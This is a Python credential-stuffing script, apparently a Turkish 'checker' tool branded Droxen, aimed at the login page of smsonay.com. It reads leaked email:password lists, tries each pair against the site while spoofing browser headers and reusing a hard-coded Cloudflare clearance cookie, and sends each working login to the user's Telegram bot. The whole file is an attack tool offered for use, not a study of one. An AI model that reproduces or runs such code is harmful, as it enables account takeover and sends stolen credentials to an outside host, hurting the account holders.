import requests
import cfonts
import os

Droxen = cfonts.render('Droxen', colors=['white', 'blue'], align='center')
print(f'''\n
  ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓   
     
                      {Droxen}
      ~ Programmer : @En4rt | Channel: @DroxenTool ~\n   smsonay.com checker
 
   ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛    
''')
token = input(' - Token Girin :')
id = input(' - İd Girin :')
EnartCombo = input(' - Combo Girin :')
os.system('cls' if os.name == 'nt' else 'clear')
print(Droxen)
print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

with open(EnartCombo, 'r') as file:
    for line in file:
        try:
            email, pas = line.strip().split(':')
            session = requests.Session()
            session.get("https://vavsms.com/ajax/login")
            ses = session.cookies.get("ci_session")
            response = requests.post('https://www.smsonay.com/ajax/login', cookies = {
    'ci_session': ses,
    'cf_clearance': 'sjf8MK4cr1pmx53kdqTsQ9Lbwu6uxc_W4arEsA5p88c-1756268624-1.2.1.1-FtvSkic_Sh1FqWNlvNGw0o0eV0gXkVfWFMVNPNopDf.oY15h13.nx0l1edvLsV3BgqZSvPo6pksBdn85qe3.HcQGmHHsrsavC874xSZbx4x2KsDW.25Ry_CDucFbQDtRclM5NSdgZy6_sryyulZWONDsXS6DB9Mr8gK5NwLY6079YitMOuMTmzPBcNOGxrZA0umhbohxub4W9g7Yxk3GFcacpcB2Xd84a9plqsMH8nE',
}, headers = {
    'authority': 'www.smsonay.com',
    'accept': '*/*',
    'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://www.smsonay.com',
    'referer': 'https://www.smsonay.com/login',
    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}, data = {
    'email': email,
    'password': pas,
    }
    )
            if "true" in response.text:
                print(f'✅ Giriş Başarılı  | {email}:{pas}')
                requests.post(
    f"https://api.telegram.org/bot{token}/sendMessage",
    data={"chat_id": id, "text": f"✅Durum: Giriş Başarılı\n📧Mail: {email}\n🔑Password: {pas}\n🔗Url: https://smsonay.com"}
)
            else:
                print(f'❌ Giriş Başarısız | {email}:{pas}')

        except Exception as e:
            print(f'Hata: {e}')
